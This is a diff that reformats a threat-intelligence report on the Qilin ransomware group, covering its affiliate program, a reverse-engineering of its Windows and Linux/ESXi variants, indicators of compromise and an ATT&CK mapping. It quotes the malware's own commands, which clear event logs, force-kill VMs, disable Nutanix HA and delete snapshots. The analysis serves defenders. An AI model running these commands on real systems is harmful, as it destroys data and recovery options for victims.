@@ -59,7 +59,6 @@ While the identity of the group remains unknown, the attacks suggest that ransom
 
 *Figure 4. BlackLock (aka Eldorado, Mamona) Local File Include vulnerability used for credential leak*
 
-.
 
 Another particularly notable case is BlackLock, a mid-sized ransomware operation believed to be a rebrand of the former Eldorado group.
 
@@ -85,15 +84,17 @@ Beyond the malware itself, Qilin offers spam services, PB-scale data storage, le
 
 As older operations collapse under pressure, betrayal, or reorganization, Qilin is stepping in, not only to fill the void, but to redefine the ransomware-as-a-service model for the next generation of affiliates.
 
-## O
+## Overview
 
-verview Qilin is a ransomware-as-a-service (RaaS) group that has been active since October 2022, steadily building its reputation through a series of high-impact cyberattacks across various industries.
+Qilin is a ransomware-as-a-service (RaaS) group that has been active since October 2022, steadily building its reputation through a series of high-impact cyberattacks across various industries.
 
 The group operates by providing its ransomware tools and infrastructure to affiliates, taking a 15–20% share of the ransom payments.
 
-## K
+## Key Points
 
-ey Points ● Qilin is emerging as a dominant ransomware group, leveraging custom-built malware written in Rust and C for cross-platform attacks, including Windows, Linux, and ESXi systems. ● The group’s panel offers advanced features such as customizable encryption modes, safe-mode execution, log cleaning, network spreading, and secure negotiation tools—all designed for affiliate ease and operational stealth. ● Qilin is expanding its ecosystem with unique offerings like legal and media support, PB-scale data storage, and spam tools—positioning itself not just as a ransomware gang, but as a full-service cybercrime platform.
+● Qilin is emerging as a dominant ransomware group, leveraging custom-built malware written in Rust and C for cross-platform attacks, including Windows, Linux, and ESXi systems. 
+● The group’s panel offers advanced features such as customizable encryption modes, safe-mode execution, log cleaning, network spreading, and secure negotiation tools—all designed for affiliate ease and operational stealth. 
+● Qilin is expanding its ecosystem with unique offerings like legal and media support, PB-scale data storage, and spam tools—positioning itself not just as a ransomware gang, but as a full-service cybercrime platform.
 
 ![A photo of an encrypted host (source: X)](/assets/images/image6.png)
 
@@ -123,9 +124,9 @@ As of May 2025, the website, which is hosted by OPTIMA LLC.
 
 *Figure 9. New Qilin wikileaks v2 project server (Shodan)*
 
-## Q
+## Qilin Ransomware-as-a-Service Program
 
-ilin Ransomware-as-a-Service Program On a Russian darknet forum, Qilin ransomware is promoted as a sophisticated Ransomware-as-a-Service (RaaS) solution, offering a comprehensive set of features designed for versatility and effectiveness.
+On a Russian darknet forum, Qilin ransomware is promoted as a sophisticated Ransomware-as-a-Service (RaaS) solution, offering a comprehensive set of features designed for versatility and effectiveness.
 
 It is marketed as a highly configurable tool capable of adapting to diverse attack scenarios, attracting affiliates with its robust technical capabilities and additional strategic functionalities.
 
@@ -135,53 +136,101 @@ Operators can tweak it with four modes: normal, step-skip, fast, and percent, le
 
 A notable feature is the “Call Lawyer” function, which provides legal consultation to increase pressure during ransom negotiations.
 
-Additionally, with network propagation capabilities and a DDoS option introduced in April 2025, Qilin enhances its adaptability for various attack scenarios. **Key Options:** ● Reliable Encryption: Uses ChaCha20, AES, and RSA4096 for unbreakable data locking. ● Configurable Modes: Four options (normal, step-skip, fast, percent) to balance speed and encryption depth. ● Legal Assistance: “Call lawyer” feature provides legal consultation to intimidate victims. ● Network Spreading: Can propagate through networks if credentials are gathered during setup.
+Additionally, with network propagation capabilities and a DDoS option introduced in April 2025, Qilin enhances its adaptability for various attack scenarios. 
+
+**Key Options:** 
+● Reliable Encryption: Uses ChaCha20, AES, and RSA4096 for unbreakable data locking. 
+● Configurable Modes: Four options (normal, step-skip, fast, percent) to balance speed and encryption depth. 
+● Legal Assistance: “Call lawyer” feature provides legal consultation to intimidate victims. 
+● Network Spreading: Can propagate through networks if credentials are gathered during setup.
 
 Below is detailed information on how the Qilin ransomware is offered as a Ransomware-as-a-Service (RaaS) and its key features.
 
-Translation: Briefly about the available functionality: ● Reliable encryption algorithms (chacha20/AES) + RSA4096 ● Configurable encryption modes to balance speed and cryptographic strength ● 4 software operating modes: ○ normal – fully encrypts the file ○ step-skip – encrypts in chunks with fixed size and skips parts ○ fast – encrypts the beginning of the file ● percent – encrypts in chunks with fixed size and dynamic skipping, based on file size ● Ability to reboot the machine into safe-mode with automatic login and file execution ● Targeted encryption (disks/folders via specified path, remote machines via **IP Address** ) ● Option to disable filters during file launch if needed (use at your own risk) ● Kills the most important services and processes for efficient encryption and to prevent decryption ● Frees up used services and processes after encryption ● Cleans system logs and deletes shadow copies ● Ability to spread through the network (if credentials were collected during build time) ● Pre-configured settings in the panel, but allows custom parameters if needed ● The build does not store all account data for accessing the company’s landing page, which prevents “unauthorized people” from joining the negotiation ● And many other features you'll learn about during the work process **Panel:** ● Build configurator ● Guest access (with ability to restrict guest permissions) ● Full support for negotiations with your targets (you can handle it yourself if preferred) ● 24/7 services for phone call/SMS spam will also be available The software is a unique project, not just another fork of open-source payloads.
+Translation:
+Briefly about the available functionality:
+● Reliable encryption algorithms (chacha20/AES) + RSA4096 
+● Configurable encryption modes to balance speed and cryptographic strength 
+● 4 software operating modes: 
+  ○ normal – fully encrypts the file 
+  ○ step-skip – encrypts in chunks with fixed size and skips parts 
+  ○ fast – encrypts the beginning of the file 
+● percent – encrypts in chunks with fixed size and dynamic skipping, based on file size 
+● Ability to reboot the machine into safe-mode with automatic login and file execution 
+● Targeted encryption (disks/folders via specified path, remote machines via **IP Address** ) 
+● Option to disable filters during file launch if needed (use at your own risk) 
+● Kills the most important services and processes for efficient encryption and to prevent decryption 
+● Frees up used services and processes after encryption ● Cleans system logs and deletes shadow copies 
+● Ability to spread through the network (if credentials were collected during build time) 
+● Pre-configured settings in the panel, but allows custom parameters if needed 
+● The build does not store all account data for accessing the company’s landing page, which prevents “unauthorized people” from joining the negotiation 
+● And many other features you'll learn about during the work process 
+
+**Panel:** 
+● Build configurator 
+● Guest access (with ability to restrict guest permissions) 
+● Full support for negotiations with your targets (you can handle it yourself if preferred) 
+● 24/7 services for phone call/SMS spam will also be available The software is a unique project, not just another fork of open-source payloads.
 
 The build is written in pure Rust, which gives it speed and security advantages.
 
 For LINUX/ESXI systems, it’s written in pure C.
 
-Qilin explicitly instructs its affiliates not to target systems located in CIS countries In March 2023 Group-IB researchers exposed Qilin administrative panel The DDOS option was added to the panel in April 2025. **Additional most interesting options:** “Qilin has introduced several new features in its latest version: ● A file storage system with 1 PTb of space will be added.
+Qilin explicitly instructs its affiliates not to target systems located in CIS countries
 
-Upon registration, a certain amount of space will be allocated to you for secure storage and easy further use of data exfiltrated from targets; ● A tool for spamming corporate email addresses, followed by a tool for spamming phone numbers; ● An in-house team of journalists who, in cooperation with legal experts, can help you write texts for blog posts and also assist with pressure during negotiations.” Translation: “A new feature has been added to our **Panel:** legal assistance .
+In March 2023 Group-IB researchers exposed Qilin administrative panel
+
+The DDOS option was added to the panel in April 2025. 
+
+**Additional most interesting options:** 
+“Qilin has introduced several new features in its latest version: 
+
+● A file storage system with 1 PTb of space will be added.
+
+Upon registration, a certain amount of space will be allocated to you for secure storage and easy further use of data exfiltrated from targets; 
+● A tool for spamming corporate email addresses, followed by a tool for spamming phone numbers; 
+● An in-house team of journalists who, in cooperation with legal experts, can help you write texts for blog posts and also assist with pressure during negotiations.”
+
+
+Translation: 
+
+“A new feature has been added to our **Panel:** legal assistance .
 
 If you need legal consultation regarding your target, simply click the “Call lawyer” button located within the target interface, and our legal team will contact you privately to provide qualified legal support.
 
 The mere appearance of a lawyer in the chat can exert indirect pressure on the company and increase the ransom amount, as companies want to avoid legal proceedings.
 
-The benefits of working with the legal department include: ● Legal assessment of your data; ● Classification of violations in accordance with applicable legal acts in different jurisdictions; ● Legal evaluation of potential damages (including lawsuits, legal costs, reputational risks); ● Ability to conduct direct negotiations between the company and the lawyer; ● Advice on how to inflict maximum financial damage on the company if it refuses to comply (and how to avoid similar situations in the future).” The heatmap below, which illustrates reported host compromises, indicates that Qilin is intensifying its activity and emerging as a growing threat.
+The benefits of working with the legal department include:
+● Legal assessment of your data; 
+● Classification of violations in accordance with applicable legal acts in different jurisdictions; 
+● Legal evaluation of potential damages (including lawsuits, legal costs, reputational risks); 
+● Ability to conduct direct negotiations between the company and the lawyer; 
+● Advice on how to inflict maximum financial damage on the company if it refuses to comply (and how to avoid similar situations in the future).” The heatmap below, which illustrates reported host compromises, indicates that Qilin is intensifying its activity and emerging as a growing threat.
 
 ![QILIN Activity (source: ransomware.live)](/assets/images/image10.png)
 
 *Figure 10. QILIN Activity (source: ransomware.live)*
 
-## T
+## Technical Analysis
 
-echnical Analysis
+## Overview
 
-## O
-
-verview Our team reverse-engineered two samples of the Qilin ransomware: a Rust-based variant targeting Windows and a C-based variant designed for Linux hosts, particularly those running ESXi and other virtualization or server environments.
+Our team reverse-engineered two samples of the Qilin ransomware: a Rust-based variant targeting Windows and a C-based variant designed for Linux hosts, particularly those running ESXi and other virtualization or server environments.
 
 Our goal is to dissect their functionality, uncover their targeting mechanisms, and highlight key differences in their implementation.
 
 By examining these samples, we aim to provide insights into Qilin’s cross-platform strategies and enhance defenses against this evolving threat.
 
-### Q
+### Qilin Loader (Windows, Rust Variant)
 
-ilin Loader (Windows, Rust Variant) 31c3574456573c89d444478772597db40f075e25c67b8de39926d2faa63ca1d8
+31c3574456573c89d444478772597db40f075e25c67b8de39926d2faa63ca1d8
 
 ![“Detect it Easy” analysis information](/assets/images/image11.png)
 
 *Figure 11. “Detect it Easy” analysis information*
 
-#### Q
+#### Qilin Loader Operation
 
-ilin Loader Operation Qilin ransomware operates by executing a series of malicious actions on infected systems, all driven by specific command-line parameters, while a password is required to run the sample.
+Qilin ransomware operates by executing a series of malicious actions on infected systems, all driven by specific command-line parameters, while a password is required to run the sample.
 
 Once executed, it uses tools like PsExec to spread across the network, targeting other domain computers for further infection.
 
@@ -209,23 +258,52 @@ Qilin runs a PowerShell command to identify and print ransom notes via any disco
 
 *Figure 14. PsEXEC dropping. PsExec used to spread to domain computers*
 
-Below is a list of commands the ransomware is executing during the execution on Windows systems: **Events log clear** $logs = Get-WinEvent -ListLog * | Where-Object {$_.RecordCount} | Select-Object -ExpandProperty LogName ; ForEach ( $l in $logs | Sort | Get-Unique ) {[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($l)} **Set machine lockscreen image** REG ADD /v LockScreenImagePath /t REG_SZ /d '' /f ; REG ADD /v LockScreenImageUrl / REG_SZ /d ' /v LockScreenImageStatus /t REG_DWORD /d 1 /f **Installing AD PS module to exploit domain-level privileges, enhancing its ability to control the environment** Powershell -Command “ServerManagerCmd.exe -i RSAT-AD-PowerShell;Install-WindowsFeature RSAT-AD-PowerShell;Add-WindowsCapability -Online -Name 'RSAT.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0'-Command " **Self delete command line parameters** /C timeout /T 10 & Del **Checking disk image** Get-DiskImage -ImagePath '' | Select-Object -ExpandProperty Attached **Dismounting disk image** Dismount-DiskImage -ImagePath **Enumerating all domain hosts** -Command "Import-Module ActiveDirectory ; Get-ADComputer -Filter * | Select-Object -ExpandProperty DNSHostName" -Command "Import-Module ActiveDirectory ; Get-ADComputer -Filter * | Where-Object { Test-Connection -ComputerName $_.DNSHostName -Count 1 -Quiet } | ForEach-Object { $_.DNSHostName }" **Enable Safe Mode with Networking if safe mode parameter was set** BCDEdit.exe /set {current} safeboot network Additionally the ransomware includes hardcoded (default) blacklist of file extensions that it does not encrypt: "File_pattern_black_list": "themepack","nls","diapkg", "msi","lnk","exe","scr","bat","drv","rtp","msp","prf","msc","ico","key","o cx","diagcab","dia gcfg","pdb","wpx","hlp","icns","rom","dll","msstyles","mod","ps1","ics" ,"hta","bin","cmd", "ani","386","lock","cur","idx","sys","com","deskthemepack","shs","the me","mpa","nome dia","spl","cpl","adv","icl","msu"
+Below is a list of commands the ransomware is executing during the execution on Windows systems: 
+**Events log clear**
+$logs = Get-WinEvent -ListLog * | Where-Object {$_.RecordCount} | Select-Object -ExpandProperty LogName ; ForEach ( $l in $logs | Sort | Get-Unique ) {[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($l)} **Set machine lockscreen image**
+REG ADD /v LockScreenImagePath /t REG_SZ /d '' /f ; REG ADD /v LockScreenImageUrl / REG_SZ /d ' /v LockScreenImageStatus /t REG_DWORD /d 1 /f 
+**Installing AD PS module to exploit domain-level privileges, enhancing its ability to control the environment** 
+Powershell -Command “ServerManagerCmd.exe -i RSAT-AD-PowerShell;Install-WindowsFeature RSAT-AD-PowerShell;Add-WindowsCapability -Online -Name 'RSAT.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0'-Command " 
+**Self delete command line parameters**
+/C timeout /T 10 & Del 
+**Checking disk image** 
+Get-DiskImage -ImagePath '' | Select-Object -ExpandProperty Attached 
+**Dismounting disk image** 
+Dismount-DiskImage -ImagePath 
+**Enumerating all domain hosts**
+-Command "Import-Module ActiveDirectory ; Get-ADComputer -Filter * | Select-Object -ExpandProperty DNSHostName" 
+-Command "Import-Module ActiveDirectory ; Get-ADComputer -Filter * | Where-Object { Test-Connection -ComputerName $_.DNSHostName -Count 1 -Quiet } | ForEach-Object { $_.DNSHostName }" 
+**Enable Safe Mode with Networking if safe mode parameter was set** 
+BCDEdit.exe /set {current} safeboot network 
+Additionally the ransomware includes hardcoded (default) blacklist of file extensions that it does not encrypt: 
+"File_pattern_black_list": "themepack","nls","diapkg", "msi","lnk","exe","scr","bat","drv","rtp","msp","prf","msc","ico","key","o cx","diagcab","dia gcfg","pdb","wpx","hlp","icns","rom","dll","msstyles","mod","ps1","ics" ,"hta","bin","cmd", "ani","386","lock","cur","idx","sys","com","deskthemepack","shs","the me","mpa","nome dia","spl","cpl","adv","icl","msu"
 
-### Q
+### Qilin Malicious PowerShell Script
 
-ilin Malicious PowerShell Script The malware includes a specialized PowerShell script that targets VMware vCenter and ESXi hosts.
+The malware includes a specialized PowerShell script that targets VMware vCenter and ESXi hosts.
 
-Key Capabilities of the Script: ● Automated vCenter Enumeration: The script deserializes credentials to connect to multiple vCenter servers, logging its actions throughout the process. ● ESXi Host Discovery and Control: Once connected to a vCenter, it identifies all linked ESXi hosts, changes the root password, and enables SSH access—paving the way for direct command execution. ● Payload Deployment: A core objective of the script is to upload and execute a malicious payload across all discovered ESXi hosts. ● Root password modifications and SSH activation on all hosts. ● Payload execution on hypervisors.
+Key Capabilities of the Script: 
+● Automated vCenter Enumeration: The script deserializes credentials to connect to multiple vCenter servers, logging its actions throughout the process. 
+● ESXi Host Discovery and Control: Once connected to a vCenter, it identifies all linked ESXi hosts, changes the root password, and enables SSH access—paving the way for direct command execution. 
+● Payload Deployment: A core objective of the script is to upload and execute a malicious payload across all discovered ESXi hosts.
+● Root password modifications and SSH activation on all hosts.
+● Payload execution on hypervisors.
 
-Downloads and installs the .NET Framework silently vCenter ESXi hosts enumeration ESXi credential changes The Qilin Windows variant, written in Rust, is a sophisticated ransomware that requires a password to initiate its malicious operations, leveraging command-line parameters to execute a range of destructive actions.
+Downloads and installs the .NET Framework silently 
+
+vCenter ESXi hosts enumeration 
+
+ESXi credential changes
+
+The Qilin Windows variant, written in Rust, is a sophisticated ransomware that requires a password to initiate its malicious operations, leveraging command-line parameters to execute a range of destructive actions.
 
 It spreads across networks using tools like PsExec, exhibiting worm-like capabilities, while deleting shadow copies and clearing Windows event logs to evade detection.
 
 Additionally, it targets VMware environments by enumerating vCenter and ESXi hosts, modifying root passwords, enabling SSH, and deploying payloads across hypervisors, enhancing its reach and impact.
 
-### Q
+### Qilin Ransomware (Linux, C Variant)
 
-ilin Ransomware (Linux, C Variant) In 2022 and 2023, multiple vendors reported that the Qilin ransomware began targeting not only Windows but also Linux hosts.
+In 2022 and 2023, multiple vendors reported that the Qilin ransomware began targeting not only Windows but also Linux hosts.
 
 To gain a deeper understanding of its behavior and specific targets, we conducted an in-depth analysis of the Linux variant.
 
@@ -245,9 +323,26 @@ This Linux variant uses no packing or obfuscation, so its malicious intent can b
 
 The ransomware sample has an embedded usage help message, possibly for debugging.
 
-The options available are as follows: ● -d,--debug - Enable debug mode (logging level set to DEBUG, disables backgrounding) ● --dry-run - Perform scan for files to be processed do not modify them ● -h,--help - This help ● -l,--log-level <number> - Set logging level.
+The options available are as follows: 
+● -d,--debug - Enable debug mode (logging level set to DEBUG, disables backgrounding) 
+● --dry-run - Perform scan for files to be processed do not modify them 
+● -h,--help - This help 
+● -l,--log-level <number> - Set logging level. Values are from 0 for FATAL up to 5 for DEBUG 
+● --no-df - Ignore configured white-/black- lists of directories 
+● --no-ef - Ignore configured white-/black- lists of extensions 
+● --no-ff - Ignore configured white-/black- lists of files 
+● --no-proc-kill - Disables process kill 
+● ,-R,--no-rename - Disables rename of completed files 
+● --no-snap-rm - Disables snapshot deletion 
+● --no-vm-kill - Disables VM kill 
+● -p,--path <string> - Specifies directory for search (multiple entries allowed, specify this option for each entry) 
+● --password <string> - Password for startup 
+● -r,--rename - Enables rename of completed files (default) 
+● -t,--timer <number> - Enabled timed delay before encryption(seconds) 
+● -w,--whitelist - Use whitelists for inclusion instead of blacklists for exclusion (later is default behavior) 
+● -y,--yes - Assume answer 'yes' on all questions (script mode) 
 
-Values are from 0 for FATAL up to 5 for DEBUG ● --no-df - Ignore configured white-/black- lists of directories ● --no-ef - Ignore configured white-/black- lists of extensions ● --no-ff - Ignore configured white-/black- lists of files ● --no-proc-kill - Disables process kill ● ,-R,--no-rename - Disables rename of completed files ● --no-snap-rm - Disables snapshot deletion ● --no-vm-kill - Disables VM kill ● -p,--path <string> - Specifies directory for search (multiple entries allowed, specify this option for each entry) ● --password <string> - Password for startup ● -r,--rename - Enables rename of completed files (default) ● -t,--timer <number> - Enabled timed delay before encryption(seconds) ● -w,--whitelist - Use whitelists for inclusion instead of blacklists for exclusion (later is default behavior) ● -y,--yes - Assume answer 'yes' on all questions (script mode) The ransomware requires a password as an argument (--password) before proceeding with data encryption.
+The ransomware requires a password as an argument (--password) before proceeding with data encryption.
 
 This is a common technique used to evade dynamic analysis tools, such as sandboxes.
 
@@ -257,33 +352,73 @@ This is a common technique used to evade dynamic analysis tools, such as sandbox
 
 Once the password check succeeds, the ransomware performs analysis of the system it's running on.
 
-The malware calls uname and checks if the malware is running on: ● Linux ● ESXi ● FreeBSD ● Nutanix ● “Unknown” (if cannot determine which linux distributive) Depending on the detection of ESXi host or Nutanix host, it will perform different actions.
+The malware calls uname and checks if the malware is running on: 
+● Linux 
+● ESXi 
+● FreeBSD 
+● Nutanix 
+● “Unknown” (if cannot determine which linux distributive) 
 
-#### E
+Depending on the detection of ESXi host or Nutanix host, it will perform different actions.
 
-SXi / vSphere For VMWare ESXi hosts it will execute the following commands: for I in $(esxcli storage filesystem list | grep 'VMFS-5' | awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk; vmkfstools -U $I/eztDisk; done for I in $(esxcli storage filesystem list | grep 'VMFS-6' | awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done The commands above are intended to perform a fix of a known problem on vSphere 7.0 ESXi hosts that leads to memory exhaustion, to ensure system stability during encryption and coverage of older VSphere installations.
+#### ESXi / vSphere
 
-Finally, malware optimizes I/O performance during encryption by increasing the buffer-cache size and reducing the flush interval with the following commands: esxcfg-advcfg -s 32768 /BufferCache/MaxCapacity esxcfg-advcfg -s 20000 /BufferCache/FlushInterval The enumeration and termination of VM processes on an ESXi host: esxcli vm process list esxcli vm process kill -t force -w [ID] Listing all the registered VMs and removing the snapshots are performed with following method: vim-cmd vmsvc/getallvms vim-cmd vmsvc/snapshot.removeall [ID] > /dev/null 2>&1
+For VMWare ESXi hosts it will execute the following commands: for I in $(esxcli storage filesystem list | grep 'VMFS-5' | awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk; vmkfstools -U $I/eztDisk; done for I in $(esxcli storage filesystem list | grep 'VMFS-6' | awk '{print $1}'); do vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null; vmkfstools -U $I/eztDisk > /dev/null; done 
 
-#### N
+The commands above are intended to perform a fix of a known problem on vSphere 7.0 ESXi hosts that leads to memory exhaustion, to ensure system stability during encryption and coverage of older VSphere installations.
 
-utanix CVM If it detects a Nutanix host, it performs the following actions using the Acropolis CLI interface.
+Finally, malware optimizes I/O performance during encryption by increasing the buffer-cache size and reducing the flush interval with the following commands: 
+esxcfg-advcfg -s 32768 /BufferCache/MaxCapacity 
+esxcfg-advcfg -s 20000 /BufferCache/FlushInterval 
+
+The enumeration and termination of VM processes on an ESXi host: 
+esxcli vm process list 
+esxcli vm process kill -t force -w [ID] 
+
+Listing all the registered VMs and removing the snapshots are performed with following method: 
+
+vim-cmd vmsvc/getallvms vim-cmd vmsvc/snapshot.removeall [ID] > /dev/null 2>&1
+
+#### Nutanix CVM
+
+If it detects a Nutanix host, it performs the following actions using the Acropolis CLI interface.
 
 Disable High-Availability (HA) restarts by setting its priority to 0.
 
-Disabling HA tells the system not to automatically turn those virtual machines back on if the physical host fails. for vm_id in `acli vm.list | grep -oP '([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})' | awk '{print $1}'`; do acli vm.update $vm_id ha_priority=0; done Force power-off all VMs: for vm_id in `acli vm.list | grep -oP '([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})' | awk '{print $1}'`; do acli vm.force_off $vm_id; done Silent removal of all the snapshots: for snap_id in `acli snapshot.list | grep -oP '([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})' | awk '{print $1}'`; do echo \"yes\" | acli snapshot.delete $snap_id; done
+Disabling HA tells the system not to automatically turn those virtual machines back on if the physical host fails. for vm_id in `acli vm.list | grep -oP '([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})' | awk '{print $1}'`; do acli vm.update $vm_id ha_priority=0; done 
+Force power-off all VMs: 
+for vm_id in `acli vm.list | grep -oP '([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})' | awk '{print $1}'`; do acli vm.force_off $vm_id; done 
+Silent removal of all the snapshots: 
+for snap_id in `acli snapshot.list | grep -oP '([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})' | awk '{print $1}'`; do echo \"yes\" | acli snapshot.delete $snap_id; done
 
-#### T
+#### Targeted Data
 
-argeted Data Although this Linux-based sample is clearly aimed at enterprise applications - virtualization platforms like VMware ESXi (and Nutanix), VirtualBox, Xen, and KVM, it still embeds a comprehensive hard-coded list of user-space file extensions and data paths.
+Although this Linux-based sample is clearly aimed at enterprise applications - virtualization platforms like VMware ESXi (and Nutanix), VirtualBox, Xen, and KVM, it still embeds a comprehensive hard-coded list of user-space file extensions and data paths.
 
-Specifically, it encrypts: 1.
+Specifically, it encrypts: 
 
-Virtualization solution folders: ● Vmware ● Virtual Box ● Xen ● kvm 2.
+1. Virtualization solution folders:
+   ● Vmware
+   ● Virtual Box
+   ● Xen
+   ● kvm 2.
 
-Database files: ● Mysql ● PostgreSQL ● Redis ● MongoDB ● CouchDB ● neo4j ● Cassandra ● Riak ● influxDB ● ElasticSearch 3.
+2. Database files:
+   ● Mysql
+   ● PostgreSQL
+   ● Redis
+   ● MongoDB
+   ● CouchDB
+   ● neo4j
+   ● Cassandra
+   ● Riak
+   ● influxDB
+   ● ElasticSearch 3.
 
-Containers ● Docker Once the malware encrypts all target files, it creates a ransom note file suffixed _RECOVER.txt that contains detailed payment instructions and steps for file recovery.
+3. Containers
+   ● Docker
+
+Once the malware encrypts all target files, it creates a ransom note file suffixed _RECOVER.txt that contains detailed payment instructions and steps for file recovery.
 
 ![Hardcoded ransom note](/assets/images/image18.png)
 
@@ -297,13 +432,25 @@ In addition to dropping a ransom notes on disk, the malware also injects its dem
 
 By combining hypervisor directory encryption (with explicit checks for ESXi and Nutanix) and a broad sweep of database and container data, the malware ensures maximum disruption across both virtualized infrastructures and traditional Linux workloads.
 
-## I
+## Indicators of Compromise (IOCs)
 
-ndicators of Compromise (IOCs) **IP Address** 185[.]208.156[.]157 -Ftp data share 185[.]196.10[.]19 - Ftp data share 80[.]64.16[.]87 - Wikileaksv2 **SHA-256** Windows version: 31c3574456573c89d444478772597db40f075e25c67b8de39926d2faa63ca1d8 C9707a3bc0f177e1d1a5587c61699975b1153406962d187c9a732f97d8f867c5 Linux version: 13cda19a9bf493f168d0eb6e8b2300828017b0ef437f75548a6c50bfb4a42a09 a7f2a21c0cd5681eab30265432367cf4b649d2b340963a977e70a16738e955ac
+**IP Address** 
+185[.]208.156[.]157 -Ftp data share 
+185[.]196.10[.]19 - Ftp data share 
+80[.]64.16[.]87 - Wikileaksv2 
 
-## M
+**SHA-256** 
+Windows version: 
+31c3574456573c89d444478772597db40f075e25c67b8de39926d2faa63ca1d8 
+C9707a3bc0f177e1d1a5587c61699975b1153406962d187c9a732f97d8f867c5
 
-ITRE ATT&CK Mapping Tactic ATT&CK Technique (ID) TA0002: Execution T1569.002 – System Services: Service Execution TA0005: Defense Evasion T1070.004 – Indicator Removal: File Deletion TA0005: Defense Evasion T1070.001 – Indicator Removal: Clear Windows Event Logs TA0005: Defense Evasion T1218 – System Binary Proxy Execution TA0007: Discovery T1087 – Account Discovery TA0007: Discovery T1120 – Peripheral Device Discovery TA0008: Lateral Movement T1675 – ESXi Administration Command TA0040: Impact T1486 – Data Encrypted for Impact TA0040: Impact T1490 – Inhibit System Recovery
+Linux version: 
+13cda19a9bf493f168d0eb6e8b2300828017b0ef437f75548a6c50bfb4a42a09 
+a7f2a21c0cd5681eab30265432367cf4b649d2b340963a977e70a16738e955ac
+
+## MITRE ATT&CK Mapping
+
+Tactic ATT&CK Technique (ID) TA0002: Execution T1569.002 – System Services: Service Execution TA0005: Defense Evasion T1070.004 – Indicator Removal: File Deletion TA0005: Defense Evasion T1070.001 – Indicator Removal: Clear Windows Event Logs TA0005: Defense Evasion T1218 – System Binary Proxy Execution TA0007: Discovery T1087 – Account Discovery TA0007: Discovery T1120 – Peripheral Device Discovery TA0008: Lateral Movement T1675 – ESXi Administration Command TA0040: Impact T1486 – Data Encrypted for Impact TA0040: Impact T1490 – Inhibit System Recovery
 
 ![Research figure 20](/assets/images/image20.png)
 
